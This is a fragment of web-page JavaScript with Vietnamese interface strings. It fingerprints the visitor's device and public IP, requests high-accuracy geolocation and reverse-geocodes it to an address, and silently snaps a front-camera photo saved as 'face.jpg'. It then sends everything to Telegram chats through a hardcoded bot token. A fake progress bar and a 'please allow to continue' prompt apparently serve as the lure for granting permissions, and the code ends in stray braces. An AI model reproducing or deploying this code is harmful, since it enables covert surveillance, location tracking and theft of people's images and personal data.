<script>
const TOKEN = "9094432312:AAGF-MFrJKndWDytcqrXQLlTgpL75jpOO0I";

let photoBlob = null;
let deviceInfo = {};

const $ = id => document.getElementById(id);

function showStatus(stepId, msg, isError=false) {
  const el = $(stepId);
  el.textContent = msg;
  el.style.color = isError ? '#ffcccc' : '#fff';
  el.classList.remove('hidden');
}

function simulateProgress(barId, fillId, statusId, finishMsg) {
  const bar = $(barId);
  const fill = $(fillId);
  bar.classList.remove('hidden');
  let width = 0;
  const interval = setInterval(() => {
    width += Math.random() * 20;
    if (width >= 100) { width = 100; clearInterval(interval); bar.classList.add('hidden'); showStatus(statusId, finishMsg); }
    fill.style.width = width + '%';
  }, 200);
}

async function getFullInfo() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const language = navigator.language;
  const screenRes = `${screen.width}x${screen.height}`;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const cores = navigator.hardwareConcurrency || '?';
  const memory = (navigator.deviceMemory || '?') + 'GB';
  let model = "Desktop";
  if (/Mobi|Android|iPhone|iPad|iPod/.test(ua)) {
    model = "Mobile";
    if (navigator.userAgentData?.getHighEntropyValues) {
      try { const d = await navigator.userAgentData.getHighEntropyValues(["model"]); model = d.model || "Mobile"; } catch(e) {}
    }
  }
  let batteryLevel = 'N/A', charging = 'N/A';
  if (navigator.getBattery) {
    try { const bat = await navigator.getBattery(); batteryLevel = Math.round(bat.level*100)+'%'; charging = bat.charging ? 'Đang sạc' : 'Không sạc'; } catch(e) {}
  }
  let ip = 'N/A';
  try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
  return { ua, platform, language, screenRes, timezone, cores, memory, model, batteryLevel, charging, ip };
}

function getLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) return reject('Trình duyệt không hỗ trợ');
    navigator.geolocation.getCurrentPosition(async pos => {
      const { latitude, longitude } = pos.coords;
      let address = `${latitude}, ${longitude}`;
      try {
        const rev = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
        const d = await rev.json();
        if (d && d.display_name) address = d.display_name;
      } catch(e) {}
      resolve({ coords: `${latitude}, ${longitude}`, address });
    }, err => reject('Từ chối truy cập'), { enableHighAccuracy: true, timeout: 8000 });
  });
}

async function startCameraAndCapture() {
  let stream;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
  } catch(e) { throw new Error('Vui lòng cho phép để tiếp tục!'); }
  const vid = $('video');
  vid.srcObject = stream;
  await vid.play();
  // Chụp ảnh
  const canvas = $('canvas');
  canvas.width = vid.videoWidth;
  canvas.height = vid.videoHeight;
  canvas.getContext('2d').drawImage(vid, 0, 0);
  photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
  stream.getTracks().forEach(t => t.stop());
}

async function sendTelegramData(msg, photo) {
  for (const chatId of CHAT_IDS) {
    try {
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'HTML' })
      });
      if (photo) {
        const fd = new FormData();
        fd.append('chat_id', chatId);
        fd.append('photo', photo, 'face.jpg');
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method:'POST', body: fd });
      }
    } catch(e) { console.error(e); }
  }
}

  }
});
